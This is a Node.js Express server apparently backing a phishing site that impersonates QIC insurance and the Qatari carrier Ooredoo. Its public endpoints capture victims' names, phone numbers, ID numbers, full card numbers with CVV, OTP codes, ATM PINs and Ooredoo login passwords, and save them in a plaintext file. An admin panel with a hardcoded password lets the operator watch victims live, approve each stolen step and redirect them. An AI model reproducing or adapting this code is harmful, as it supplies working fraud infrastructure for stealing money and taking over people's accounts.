const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');
const DATA_FILE = path.join(__dirname, 'data', 'visits.json');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';

app.use(express.json());
app.use(express.static(PUBLIC_DIR));

// ---- Persistent visit store (JSON file) ----
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

let visits = {};
try {
  if (fs.existsSync(DATA_FILE)) {
    visits = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    console.log(`Loaded ${Object.keys(visits).length} visits from disk`);
  }
} catch (e) {
  console.error('Failed to load visits from disk, starting fresh:', e.message);
  visits = {};
}

let saveTimer = null;
function saveVisits() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    try {
      fs.writeFileSync(DATA_FILE, JSON.stringify(visits, null, 2), 'utf8');
    } catch (e) {
      console.error('Failed to save visits:', e.message);
    }
  }, 500);
}

const ACTIVE_WINDOW_MS = 5 * 60 * 1000;

// ---- Active sessions tracking (heartbeat) ----
const activeSessions = {};
const ACTIVE_SESSION_TIMEOUT_MS = 10 * 1000;

function getActiveVisitorsCount() {
  const now = Date.now();
  return Object.values(activeSessions).filter(s => (now - s.lastSeen) < ACTIVE_SESSION_TIMEOUT_MS).length;
}

setInterval(() => {
  const now = Date.now();
  Object.keys(activeSessions).forEach(sid => {
    if ((now - activeSessions[sid].lastSeen) > 60 * 1000) {
      delete activeSessions[sid];
    }
  });
}, 30 * 1000);

// ---- In-memory admin session tokens ----
const adminTokens = new Set();

const orders = [];

function requireAdmin(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (token && adminTokens.has(token)) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

function requireAdminPassword(req, res, next) {
  const password = req.headers['x-admin-password'];
  if (password === ADMIN_PASSWORD) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

// ---- Admin auth ----
app.post('/api/admin-login', (req, res) => {
  const { password } = req.body || {};
  if (password === ADMIN_PASSWORD) {
    const token = crypto.randomBytes(24).toString('hex');
    adminTokens.add(token);
    return res.json({ ok: true, token });
  }
  res.status(401).json({ error: 'wrong password' });
});

app.post('/api/admin-logout', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (token) adminTokens.delete(token);
  res.json({ ok: true });
});

// ---- Admin API: check password ----
app.get('/api/admin/check', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password === ADMIN_PASSWORD) {
    return res.json({ ok: true });
  }
  res.status(401).json({ error: 'unauthorized' });
});

// ---- Admin API: get orders ----
app.get('/api/admin/orders', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  console.log('📊 Current visits:', Object.keys(visits).length, 'orders');

  const ordersList = Object.values(visits).map(v => {
    return {
      ...v,
      ref: v.visitId,
      ts: v.createdAt || v.updatedAt || Date.now(),
      status: v.status || 'active',
      n: v.name || v.n || 'بدون اسم',
      p: v.phone || v.p || '',
      e: v.email || v.e || '',
      id: v.id || v.qid || '',
      dob: v.dob || v.birthDate || v.birth_date || '',
      idExpiry: v.idExpiry || v.id_expiry || v.qid_expiry || '',
      step: v.step || 'form',
      pay: v.pay || null,
      ooredoo: v.ooredoo || null,
    };
  });

  const activeVisitors = getActiveVisitorsCount();
  res.json({
    orders: ordersList,
    active: activeVisitors
  });
});

// ---- Admin API: clear all orders ----
app.post('/api/admin/clear', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  Object.keys(visits).forEach(key => delete visits[key]);
  orders.length = 0;
  saveVisits();

  res.json({ ok: true, message: 'تم مسح جميع السجلات' });
});

// ---- Admin API: delete specific order ----
app.delete('/api/admin/orders/:ref', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  const { ref } = req.params;
  if (visits[ref]) {
    delete visits[ref];
    saveVisits();
    return res.json({ ok: true });
  }
  res.status(404).json({ error: 'order not found' });
});

// ---- Admin API: make decision on order ----
app.post('/api/admin/decide/:ref', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  const { ref } = req.params;
  const { action, decision } = req.body || {};
  const choice = action || decision;

  const visit = visits[ref];
  if (!visit) {
    return res.status(404).json({ error: 'order not found' });
  }

  const step = visit.step || 'card';

  if (choice === 'accept') {
    if (step === 'card' || step === 'payment') {
      visit.status = 'payment_accepted';
    } else if (step === 'otp') {
      visit.status = 'otp_accepted';
    } else if (step === 'pin' || step === 'atm') {
      visit.status = 'atm_accepted';
    } else if (step === 'ooredoo' || step === 'ooredoo_login') {
      visit.status = 'ooredoo_login_accepted';
    } else if (step === 'ooredoo-otp' || step === 'ooredoo_otp') {
      visit.status = 'ooredoo_otp_accepted';
    }
  } else if (choice === 'reject') {
    if (step === 'card' || step === 'payment') {
      visit.status = 'payment_rejected';
    } else if (step === 'otp') {
      visit.status = 'otp_rejected';
    } else if (step === 'pin' || step === 'atm') {
      visit.status = 'atm_rejected';
    } else if (step === 'ooredoo' || step === 'ooredoo_login') {
      visit.status = 'ooredoo_login_rejected';
    } else if (step === 'ooredoo-otp' || step === 'ooredoo_otp') {
      visit.status = 'ooredoo_otp_rejected';
    }
  }

  saveVisits();
  res.json({ ok: true, visit });
});

// Helper: البحث عن visit بواسطة visitId أو paymentId
function findVisit(id) {
  if (!id) return null;
  if (visits[id]) return visits[id];
  return Object.values(visits).find(v => v.pay && v.pay.id === id) || null;
}

// ---- Public: visitor tracking ----
app.post('/api/track', (req, res) => {
  const data = req.body || {};
  const visitId = data.visitId;
  if (!visitId) return res.status(400).json({ error: 'visitId required' });

  const now = Date.now();
  const existing = visits[visitId];
  const pendingRedirect = existing ? existing.pendingRedirect || null : null;

  const cleanData = {};
  for (const [k, v] of Object.entries(data)) {
    if (v !== '' && v !== null && v !== undefined) cleanData[k] = v;
  }

  const hasPhone = cleanData.p || cleanData.phone;
  if (!existing && !hasPhone) {
    return res.json({ ok: true });
  }

  visits[visitId] = {
    ...(existing || { visitId, createdAt: now }),
    ...cleanData,
    visitId,
    updatedAt: now,
    status: existing ? existing.status : 'active',
    step: existing ? existing.step : (cleanData.step || undefined),
    pendingRedirect: null,
  };

  saveVisits();
  res.json({ ok: true, redirect: pendingRedirect || undefined });
});

// ---- Payment Processing ----
app.post('/api/payment', (req, res) => {
  const { cardName, cardNumber, expiryDate, cvv, requestId, amount, currency } = req.body || {};

  if (!cardName || !cardNumber || !expiryDate || !cvv || !requestId) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const paymentId = crypto.randomBytes(8).toString('hex');

  if (visits[requestId]) {
    visits[requestId].pay = {
      id: paymentId,
      cardName: cardName,
      cardNumber: cardNumber,
      cvv: cvv,
      exp: expiryDate,
      expiry: expiryDate,
      amount: amount,
      currency: currency,
      status: 'pending_approval',
      step: 'payment'
    };
    visits[requestId].status = 'awaiting';
    visits[requestId].step = 'card';
    visits[requestId].cardName = cardName;
    saveVisits();
  }

  res.json({ ok: true, id: paymentId });
});

// ---- Check Payment Status ----
app.get('/api/status/:id', (req, res) => {
  const { id } = req.params;
  const visit = findVisit(id);

  if (!visit) {
    return res.json({ status: 'pending' });
  }

  res.json({ status: visit.status || 'active' });
});

// ---- OTP Verification ----
app.post('/api/otp', (req, res) => {
  const { id, otp } = req.body || {};

  if (!id || !otp) {
    return res.status(400).json({ ok: false, error: 'Missing OTP or ID' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'otp';
  visit.otp = otp;
  if (visit.pay) {
    visit.pay.otp = otp;
    visit.pay.code = otp;
  }
  saveVisits();
  res.json({ ok: true });
});

// ---- ATM PIN Verification ----
app.post('/api/atm', (req, res) => {
  const { id, atmPin } = req.body || {};

  if (!id || !atmPin) {
    return res.status(400).json({ ok: false, error: 'Missing ATM PIN or ID' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'pin';
  visit.atmPin = atmPin;
  if (visit.pay) {
    visit.pay.pin = atmPin;
  }
  saveVisits();
  res.json({ ok: true });
});

// ---- Ooredoo Login ----
app.post('/api/ooredoo-login', (req, res) => {
  const { id, phone, password, username } = req.body || {};
  const userName = username || phone;

  if (!id || !userName || !password) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'ooredoo';
  visit.ooredoo = {
    username: userName,
    phone: userName,
    password: password,
    otp: visit.ooredoo ? visit.ooredoo.otp : ''
  };
  saveVisits();
  res.json({ ok: true });
});

// ---- Ooredoo OTP ----
app.post('/api/ooredoo-otp', (req, res) => {
  const { id, otp } = req.body || {};

  if (!id || !otp) {
    return res.status(400).json({ ok: false, error: 'Missing OTP or ID' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'ooredoo-otp';
  visit.ooredooOtp = otp;
  if (visit.ooredoo) {
    visit.ooredoo.otp = otp;
  } else {
    visit.ooredoo = { username: '', password: '', otp: otp };
  }
  saveVisits();
  res.json({ ok: true });
});

// ---- Heartbeat ----
app.post('/api/heartbeat', (req, res) => {
  const { sessionId, page, lang } = req.body || {};
  if (sessionId) {
    activeSessions[sessionId] = {
      lastSeen: Date.now(),
      page: page || '',
      lang: lang || 'ar'
    };
  }
  res.json({ ok: true, active: getActiveVisitorsCount() });
});

// ---- Active visitors count ----
app.get('/api/active-visitors', (req, res) => {
  res.json({ active: getActiveVisitorsCount() });
});

// ---- Admin-only: view & control visits ----
app.get('/api/visits', requireAdmin, (req, res) => {
  const now = Date.now();
  const list = Object.values(visits)
    .map(v => ({ ...v, status: (now - v.updatedAt) <= ACTIVE_WINDOW_MS ? 'active' : 'inactive' }))
    .sort((a, b) => b.updatedAt - a.updatedAt);
  res.json(list);
});

app.post('/api/redirect', requireAdmin, (req, res) => {
  const { visitId, target } = req.body || {};
  if (!visitId || !target) return res.status(400).json({ error: 'visitId and target required' });
  if (!visits[visitId]) return res.status(404).json({ error: 'visit not found' });
  visits[visitId].pendingRedirect = target;
  saveVisits();
  res.json({ ok: true });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`QIC insurance flow running at http://localhost:${PORT}`);
  console.log(`Admin dashboard at http://localhost:${PORT}/admin.html (password: ${ADMIN_PASSWORD})`);
});
